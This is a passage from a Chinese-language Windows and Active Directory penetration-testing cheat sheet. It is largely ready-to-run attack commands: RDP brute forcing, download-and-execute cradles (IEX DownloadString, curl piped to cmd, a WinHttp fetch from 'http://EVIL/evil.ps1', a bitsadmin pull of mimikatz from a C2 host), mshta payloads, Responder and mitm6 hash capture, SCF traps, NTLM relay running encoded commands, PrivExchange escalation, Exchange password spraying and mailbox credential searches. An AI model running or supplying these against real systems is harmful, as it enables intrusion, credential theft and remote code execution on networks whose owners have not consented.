<h2 id="LDAP服务枚举"><a href="#LDAP服务枚举" class="headerlink" title="LDAP服务枚举"></a>LDAP服务枚举</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">ldapsearch <span class="hljs-literal">-H</span> ldap://&lt;ip&gt;<br>ldapwhoami<br></code></pre></td></tr></table></figure>
<h2 id="RPC服务枚举"><a href="#RPC服务枚举" class="headerlink" title="RPC服务枚举"></a>RPC服务枚举</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell">rpcclient <span class="hljs-literal">-U</span> <span class="hljs-string">&quot;10.10.14.14&quot;</span><br>srvinfo<br>enumdomusers<br>enumalsgroups domain<br>lookupnames administrators<br>querydominfo<br>enumdomusers<br>queryuser &lt;user&gt;<br>lsaquery<br>lookupnames Guest<br>lookupnames Administrator<br></code></pre></td></tr></table></figure>
<h2 id="远程登录Windows桌面"><a href="#远程登录Windows桌面" class="headerlink" title="远程登录Windows桌面"></a>远程登录Windows桌面</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">rdesktop <span class="hljs-literal">-u</span> guest <span class="hljs-literal">-p</span> guest INSERTIPADDRESS <span class="hljs-literal">-g</span> <span class="hljs-number">94</span>%<br><br><span class="hljs-comment"># Brute force</span><br>ncrack <span class="hljs-literal">-vv</span> <span class="hljs-literal">--user</span> Administrator <span class="hljs-literal">-P</span> /root/oscp/passwords.txt rdp://INSERTIPADDRESS<br></code></pre></td></tr></table></figure>
<h1 id="二、Windows-下的文件传输命令"><a href="#二、Windows-下的文件传输命令" class="headerlink" title="二、Windows 下的文件传输命令"></a>二、Windows 下的文件传输命令</h1><h2 id="TFTP-服务文件传输"><a href="#TFTP-服务文件传输" class="headerlink" title="TFTP 服务文件传输"></a>TFTP 服务文件传输</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell">m0chan Machine<br>mkdir tftp<br>atftpd <span class="hljs-literal">--deamon</span> <span class="hljs-literal">--port</span> <span class="hljs-number">69</span> tftp<br><span class="hljs-built_in">cp</span> *file* tftp<br>On victim machine:<br>tftp <span class="hljs-literal">-i</span> &lt;[<span class="hljs-type">IP</span>]&gt; GET &lt;[<span class="hljs-type">FILE</span>]&gt;<br></code></pre></td></tr></table></figure>
<h2 id="FTP-服务文件传输"><a href="#FTP-服务文件传输" class="headerlink" title="FTP 服务文件传输"></a>FTP 服务文件传输</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">echo</span> open &lt;[<span class="hljs-type">IP</span>]&gt; <span class="hljs-number">21</span> &gt; ftp.txt<br><span class="hljs-built_in">echo</span> USER demo &gt;&gt; ftp.txt<br><span class="hljs-built_in">echo</span> ftp &gt;&gt; ftp.txt<br><span class="hljs-built_in">echo</span> bin &gt;&gt; ftp.txt<br><span class="hljs-built_in">echo</span> GET nc.exe &gt;&gt; ftp.txt<br><span class="hljs-built_in">echo</span> bye &gt;&gt; ftp.txt<br>ftp <span class="hljs-literal">-v</span> <span class="hljs-literal">-n</span> <span class="hljs-literal">-s</span>:ftp.txt<br></code></pre></td></tr></table></figure>
<h2 id="VBS-Script-文件传输"><a href="#VBS-Script-文件传输" class="headerlink" title="VBS Script 文件传输"></a>VBS Script 文件传输</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">echo</span> strUrl = WScript.Arguments.Item(<span class="hljs-number">0</span>) &gt; wget.vbs<br><span class="hljs-built_in">echo</span> StrFile = WScript.Arguments.Item(<span class="hljs-number">1</span>) &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> Const HTTPREQUEST_PROXYSETTING_DEFAULT = <span class="hljs-number">0</span> &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> Const HTTPREQUEST_PROXYSETTING_PRECONFIG = <span class="hljs-number">0</span> &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> Const HTTPREQUEST_PROXYSETTING_DIRECT = <span class="hljs-number">1</span> &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> Const HTTPREQUEST_PROXYSETTING_PROXY = <span class="hljs-number">2</span> &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> Err.Clear &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> http = Nothing &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> http = CreateObject(<span class="hljs-string">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>) &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> <span class="hljs-keyword">If</span> http Is Nothing Then <span class="hljs-built_in">Set</span> http = CreateObject(<span class="hljs-string">&quot;WinHttp.WinHttpRequest&quot;</span>) &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> <span class="hljs-keyword">If</span> http Is Nothing Then <span class="hljs-built_in">Set</span> http = CreateObject(<span class="hljs-string">&quot;MSXML2.ServerXMLHTTP&quot;</span>) &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> <span class="hljs-keyword">If</span> http Is Nothing Then <span class="hljs-built_in">Set</span> http = CreateObject(<span class="hljs-string">&quot;Microsoft.XMLHTTP&quot;</span>) &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> http.Open <span class="hljs-string">&quot;GET&quot;</span>,strURL,False &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> http.Send &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> varByteArray = http.ResponseBody &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> http = Nothing &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> fs = CreateObject(<span class="hljs-string">&quot;Scripting.FileSystemObject&quot;</span>) &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> ts = fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> strData = <span class="hljs-string">&quot;&quot;</span> &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> strBuffer = <span class="hljs-string">&quot;&quot;</span> &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> <span class="hljs-keyword">For</span> lngCounter = <span class="hljs-number">0</span> to UBound(varByteArray) &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> ts.Write Chr(<span class="hljs-number">255</span> And Ascb(Midb(varByteArray,lngCounter + <span class="hljs-number">1</span>,<span class="hljs-number">1</span>))) &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> Next &gt;&gt; wget.vbs<br><span class="hljs-built_in">echo</span> ts.Close &gt;&gt; wget.vbs<br><br><br><br>cscript wget.vbs &lt;url&gt; &lt;out_file&gt;<br><br>Use echoup <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">on</span> <span class="hljs-title">pentest</span>.<span class="hljs-title">ws</span> <span class="hljs-title">to</span> <span class="hljs-title">generate</span> <span class="hljs-title">echo</span> <span class="hljs-title">commands</span>.</span><br>https://pentest.ws/features<br></code></pre></td></tr></table></figure>
<h2 id="Powershell-文件传输"><a href="#Powershell-文件传输" class="headerlink" title="Powershell 文件传输"></a>Powershell 文件传输</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/danielbohannon/Invoke-CradleCrafter </span><br><span class="hljs-comment"># Use this to craft obsufacted cradles</span><br><br><span class="hljs-built_in">Invoke-WebRequest</span> <span class="hljs-string">&quot;https://server/filename&quot;</span> <span class="hljs-literal">-OutFile</span> <span class="hljs-string">&quot;C:\Windows\Temp\filename&quot;</span><br><br>(<span class="hljs-built_in">New-Object</span> System.Net.WebClient).DownloadFile(<span class="hljs-string">&quot;https://server/filename&quot;</span>, <span class="hljs-string">&quot;C:\Windows\Temp\filename&quot;</span>) <br><br><span class="hljs-comment"># Powershell下载到内存</span><br><br><span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).downloadString(<span class="hljs-string">&#x27;http://server/script.ps1&#x27;</span>)<br><br><span class="hljs-comment"># 带代理的Powershell</span><br><br><span class="hljs-variable">$browser</span> = <span class="hljs-built_in">New-Object</span> System.Net.WebClient;<br><span class="hljs-variable">$browser</span>.Proxy.Credentials = [<span class="hljs-type">System.Net.CredentialCache</span>]::DefaultNetworkCredentials;<br><span class="hljs-built_in">IEX</span>(<span class="hljs-variable">$browser</span>.DownloadString(<span class="hljs-string">&#x27;https://server/script.ps1&#x27;</span>));<br></code></pre></td></tr></table></figure>
<h2 id="Powershell-Base64-文件传输"><a href="#Powershell-Base64-文件传输" class="headerlink" title="Powershell Base64 文件传输"></a>Powershell Base64 文件传输</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$fileName</span> = <span class="hljs-string">&quot;Passwords.kdbx&quot;</span><br><span class="hljs-variable">$fileContent</span> = <span class="hljs-built_in">get-content</span> <span class="hljs-variable">$fileName</span><br><span class="hljs-variable">$fileContentBytes</span> = [<span class="hljs-type">System.Text.Encoding</span>]::UTF8.GetBytes(<span class="hljs-variable">$fileContent</span>)<br><span class="hljs-variable">$fileContentEncoded</span> = [<span class="hljs-type">System.Convert</span>]::ToBase64String(<span class="hljs-variable">$fileContentBytes</span>)<br><span class="hljs-variable">$fileContentEncoded</span> | <span class="hljs-built_in">set-content</span> (<span class="hljs-variable">$fileName</span> + <span class="hljs-string">&quot;.b64&quot;</span>)<br></code></pre></td></tr></table></figure>
<h2 id="隧道复制文件传输-pscp-exe"><a href="#隧道复制文件传输-pscp-exe" class="headerlink" title="隧道复制文件传输 &#x2F; pscp.exe"></a>隧道复制文件传输 &#x2F; pscp.exe</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">pscp.exe C:\Users\Public\m0chan.txt user@target:/tmp/m0chan.txt<br>pscp.exe user@target:/home/user/m0chan.txt C:\Users\Public\m0chan.txt<br></code></pre></td></tr></table></figure>
<h2 id="BitsAdmin-exe-工具文件传输"><a href="#BitsAdmin-exe-工具文件传输" class="headerlink" title="BitsAdmin.exe 工具文件传输"></a>BitsAdmin.exe 工具文件传输</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">cmd.exe /c <span class="hljs-string">&quot;bitsadmin.exe /transfer downld_job /download /priority high http://c2.m0chan.com C:\Temp\mimikatz.exe &amp; start C:\Temp\binary.exe&quot;</span><br></code></pre></td></tr></table></figure>
<h2 id="Remote-Desktop-文件传输"><a href="#Remote-Desktop-文件传输" class="headerlink" title="Remote Desktop 文件传输"></a>Remote Desktop 文件传输</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">rdesktop <span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span> <span class="hljs-literal">-r</span> disk:linux=<span class="hljs-string">&#x27;/home/user/filetransferout&#x27;</span><br></code></pre></td></tr></table></figure>
<h2 id="WindowsHTTP服务COM组件方式文件传输"><a href="#WindowsHTTP服务COM组件方式文件传输" class="headerlink" title="WindowsHTTP服务COM组件方式文件传输"></a>WindowsHTTP服务COM组件方式文件传输</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">[<span class="hljs-type">System.Net.WebRequest</span>]::DefaultWebProxy<br>[<span class="hljs-type">System.Net.CredentialCache</span>]::DefaultNetworkCredentials<br><span class="hljs-variable">$h</span>=<span class="hljs-built_in">new-object</span> <span class="hljs-literal">-com</span> WinHttp.WinHttpRequest.<span class="hljs-number">5.1</span>;<span class="hljs-variable">$h</span>.open(<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;http://EVIL/evil.ps1&#x27;</span>,<span class="hljs-variable">$false</span>);<span class="hljs-variable">$h</span>.send();<span class="hljs-built_in">iex</span> <span class="hljs-variable">$h</span>.responseText<br></code></pre></td></tr></table></figure>
<h2 id="CertUtil-exe-工具文件传输"><a href="#CertUtil-exe-工具文件传输" class="headerlink" title="CertUtil.exe 工具文件传输"></a>CertUtil.exe 工具文件传输</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># File Transfer</span><br><br>certutil.exe <span class="hljs-literal">-urlcache</span> <span class="hljs-operator">-split</span> <span class="hljs-operator">-f</span> https://m0chan:<span class="hljs-number">8888</span>/filename outputfilename<br><br><span class="hljs-comment"># CertUtil Base64 Transfers</span><br><br>certutil.exe <span class="hljs-literal">-encode</span> inputFileName encodedOutputFileName<br>certutil.exe <span class="hljs-literal">-decode</span> encodedInputFileName decodedOutputFileName<br></code></pre></td></tr></table></figure>
<h2 id="Curl-Windows-1803-文件传输"><a href="#Curl-Windows-1803-文件传输" class="headerlink" title="Curl (Windows 1803+) 文件传输"></a>Curl (Windows 1803+) 文件传输</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">curl</span> http://server/file <span class="hljs-literal">-o</span> file<br><span class="hljs-built_in">curl</span> http://server/file.bat | cmd<br><br><span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">curl</span> http://server/script.ps1);<span class="hljs-built_in">Invoke-Blah</span><br></code></pre></td></tr></table></figure>
<h2 id="SMB-服务文件传输"><a href="#SMB-服务文件传输" class="headerlink" title="SMB 服务文件传输"></a>SMB 服务文件传输</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">python smbserver.py Share `pwd` <span class="hljs-literal">-u</span> m0chan <span class="hljs-literal">-p</span> m0chan <span class="hljs-literal">--smb-2support</span><br></code></pre></td></tr></table></figure>
<h1 id="三、Windows-下的漏洞利用攻击集合"><a href="#三、Windows-下的漏洞利用攻击集合" class="headerlink" title="三、Windows 下的漏洞利用攻击集合"></a>三、Windows 下的漏洞利用攻击集合</h1><h2 id="使用MSHTA执行代码"><a href="#使用MSHTA执行代码" class="headerlink" title="使用MSHTA执行代码"></a>使用MSHTA执行代码</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">mshta.exe 是所有版本的Windows上提供的默认二进制文件，允许执行.hta有效载荷<br><br>mshta.exe https://m0chan.com/exploit.hta<br><br></code></pre></td></tr></table></figure>
<h2 id="LLMNR-NBT-NS-欺骗攻击"><a href="#LLMNR-NBT-NS-欺骗攻击" class="headerlink" title="LLMNR &#x2F; NBT-NS 欺骗攻击"></a>LLMNR &#x2F; NBT-NS 欺骗攻击</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 盗取信用的响应者</span><br><br>git clone https://github.com/SpiderLabs/Responder.git python Responder.py <span class="hljs-literal">-i</span> local<span class="hljs-literal">-ip</span> <span class="hljs-literal">-I</span> eth0<br><br><br>LLMNR和NBT<span class="hljs-literal">-NS</span>通常默认打开，目的是充当DNS的后备。<br>i/e如果您搜索\\HRServer\但它不存在，Windows（默认情况下）将通过网络发送LLMNR广播。<br>通过使用Responder，我们可以响应这些广播，并说出以下内容 “是的，我是HRServer，向我进行身份验证，我会得到一个可以破解或转发的NTLMv2哈希。<br></code></pre></td></tr></table></figure>
<h2 id="Responder-WPAD-攻击"><a href="#Responder-WPAD-攻击" class="headerlink" title="Responder WPAD 攻击"></a>Responder WPAD 攻击</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">responder <span class="hljs-literal">-I</span> eth0 wpad<br><br>默认情况下，Windows配置为在使用internet时搜索Web代理自动发现文件 <br>转到internet explorer并搜索谷歌，它会自动搜索WPAD文件。。。 <br>然后采取NTLMv2哈希和NTLM中继它或发送到破解钻机。<br></code></pre></td></tr></table></figure>
<h2 id="mitm6-攻击-用IPv6攻陷IPv4网络"><a href="#mitm6-攻击-用IPv6攻陷IPv4网络" class="headerlink" title="mitm6 攻击 - 用IPv6攻陷IPv4网络"></a>mitm6 攻击 - 用IPv6攻陷IPv4网络</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 当WPAD攻击不起作用时使用，这将使用IPv6和DNS将信誉中继到目标。</span><br><br>By default IPV6 should be enabled. <br>git clone https://github.com/fox<span class="hljs-literal">-it</span>/mitm6.git <br><span class="hljs-built_in">cd</span> /opt/tools/mitm6<br>pip install .<br><br>mitm6 <span class="hljs-literal">-d</span> m0chanAD.local<br><br>现在漏洞发生了，Windows更喜欢IPV6而不是IPv4，这意味着DNS=由攻击者控制。<br><br>ntlmrelayx.py <span class="hljs-literal">-wh</span> webserverhostingwpad:<span class="hljs-number">80</span> <span class="hljs-literal">-t</span> smb://TARGETIP/ <span class="hljs-literal">-i</span><br><br><span class="hljs-literal">-i</span> opens an interactive shell.<br><br>Shout out to hausec <span class="hljs-keyword">for</span> this super nice tip.<br><br></code></pre></td></tr></table></figure>
<h2 id="SCF文件攻击"><a href="#SCF文件攻击" class="headerlink" title="SCF文件攻击"></a>SCF文件攻击</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell">创建.scf文件并放入SMB共享并启动响应程序；）<br><br><br>Filename = @m0chan.scf<br><br>[<span class="hljs-type">Shell</span>]<br>Command=<span class="hljs-number">2</span><br>IconFile=\\<span class="hljs-number">10.10</span>.<span class="hljs-number">14.2</span>\Share\test.ico<br>[<span class="hljs-type">Taskbar</span>]<br>Command=ToggleDesktop<br></code></pre></td></tr></table></figure>
<h2 id="NTLM-中继攻击"><a href="#NTLM-中继攻击" class="headerlink" title="NTLM 中继攻击"></a>NTLM 中继攻击</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs powershell">解释NTLM/Net<span class="hljs-literal">-NTLMV1</span>和V2之间差异的好文章<br><br>https://byt3bl33d3r.github.io/practical<span class="hljs-literal">-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes</span>.html<br><br>TL；DR NTLMv1/v2是Net<span class="hljs-literal">-NTLMv1</span>/v2的简写，因此是相同的。<br><br>您可以使用NTLM哈希执行Pass The Hash攻击。 <br>您不能使用Net NTLM哈希执行Pass The Hash攻击。<br><br><span class="hljs-built_in">PS</span>：你不能将散列转发回它自己。 <br><span class="hljs-built_in">PS</span>:必须禁用SMB签名才能缓解这种情况，您可以使用nmap扫描或crackmapexec进行检查<br><br>crackmapexec smb <span class="hljs-number">10.10</span>.<span class="hljs-number">14.0</span>/<span class="hljs-number">24</span> <span class="hljs-literal">--gene-relay-list</span> targets.txt<br><br>这将告诉您子网中未启用SMB签名的主机的列表。<br><br>python Responder.py <span class="hljs-literal">-I</span> &lt;interface&gt; <span class="hljs-literal">-r</span> <span class="hljs-literal">-d</span> <span class="hljs-literal">-w</span><br>ntlmrelayx.py <span class="hljs-literal">-tf</span> targets.txt (默认情况下，这将转储目标的本地SAM，不是很有用吗？)<br><br>不如我们执行一个命令。<br><br>ntlmrelayx.py <span class="hljs-literal">-tf</span> targets.txt <span class="hljs-literal">-c</span> powershell.exe <span class="hljs-literal">-Enc</span> asdasdasdasd<br>ntlmrelayx.py <span class="hljs-literal">-tf</span> targets.txt <span class="hljs-literal">-c</span> powershell.exe /c download and execute beacon... = RIP<br></code></pre></td></tr></table></figure>
<h2 id="Priv-Exchange-漏洞攻击"><a href="#Priv-Exchange-漏洞攻击" class="headerlink" title="Priv Exchange 漏洞攻击"></a>Priv Exchange 漏洞攻击</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/</span><br><br>Combine privxchange.py and ntlmrelayx<br><br>ntlmrelayx.py <span class="hljs-literal">-t</span> ldap://DOMAINCONTROLLER.m0chanAD.local <span class="hljs-literal">--escalate-user</span> TARGETUSERTOESCALATE<br><br>python privexchange.py <span class="hljs-literal">-ah</span> FDQN.m0chanAD.local DOMAINCONTROLLER.m0chanAD.local <span class="hljs-literal">-u</span> TARGETUSERTOESCALATE <span class="hljs-literal">-d</span> m0chanAD.local<br><br></code></pre></td></tr></table></figure>
<h2 id="Exchange-密码喷洒攻击"><a href="#Exchange-密码喷洒攻击" class="headerlink" title="Exchange 密码喷洒攻击"></a>Exchange 密码喷洒攻击</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/dafthack/MailSniper.git</span><br><br><span class="hljs-built_in">Invoke-PasswordSprayOWA</span> <span class="hljs-literal">-ExchHostname</span> EXCH2012.m0chanAD.local <span class="hljs-literal">-UserList</span> .\users.txt <span class="hljs-literal">-Password</span> Winter2019<br><br><br><span class="hljs-comment"># https://github.com/sensepost/ruler</span><br><br>./ruler<span class="hljs-literal">-linux64</span> <span class="hljs-literal">-domain</span> mc0hanAD.local <span class="hljs-literal">--insecure</span> brute <span class="hljs-literal">--userpass</span> userpass.txt <span class="hljs-literal">-v</span><br><br></code></pre></td></tr></table></figure>
<h2 id="ExchangeRelayX-Exchange-中继-重放脚本-攻击"><a href="#ExchangeRelayX-Exchange-中继-重放脚本-攻击" class="headerlink" title="ExchangeRelayX  - Exchange 中继 &#x2F; 重放脚本 攻击"></a>ExchangeRelayX  - Exchange 中继 &#x2F; 重放脚本 攻击</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/quickbreach/ExchangeRelayX</span><br><br>用于内部部署交换服务器的到EWS端点的NTLM中继工具。为黑客提供OWA。<br><br>./exchangeRelayx.py <span class="hljs-literal">-t</span> https://mail.quickbreach.com<br><br></code></pre></td></tr></table></figure>
<h2 id="Exchange邮箱邮件泄露攻击"><a href="#Exchange邮箱邮件泄露攻击" class="headerlink" title="Exchange邮箱邮件泄露攻击"></a>Exchange邮箱邮件泄露攻击</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/dafthack/MailSniper.git</span><br><br>Enumerate GlobalAddressList<br><br><span class="hljs-built_in">Get-GlobalAddressList</span> <span class="hljs-literal">-ExchHostname</span> EXCH2012.m0chanAD.local <span class="hljs-literal">-Username</span> jamie@m0chanAD.local <span class="hljs-literal">-Password</span> Winter2019<br><br>Enumerate AD Usernames<br><br><span class="hljs-built_in">Get-ADUsernameFromEWS</span> <span class="hljs-literal">-Emaillist</span> .\users.txt<br><br>Enumerate Mailbox Folders<br><br><span class="hljs-built_in">Get-MailboxFolders</span> <span class="hljs-literal">-Mailbox</span> jamie@m0chanAD.local<br><br>Enumerate Passwords &amp; Credentials Stored <span class="hljs-keyword">in</span> Emails<br><br><span class="hljs-built_in">Invoke-SelfSearch</span> <span class="hljs-literal">-Mailbox</span> jamie@m0chanAD.local<br><br>Enumerate Passwords &amp; Credentials (Any Users) Requires DA or Exchange Admin<br><br><span class="hljs-built_in">Invoke-GlobalMailSearch</span> <span class="hljs-literal">-ImpersonationAccount</span> helenHR <span class="hljs-literal">-ExchHostname</span> Exch2012<br></code></pre></td></tr></table></figure>
<h2 id="CrackMapExec-工具利用攻击"><a href="#CrackMapExec-工具利用攻击" class="headerlink" title="CrackMapExec 工具利用攻击"></a>CrackMapExec 工具利用攻击</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td 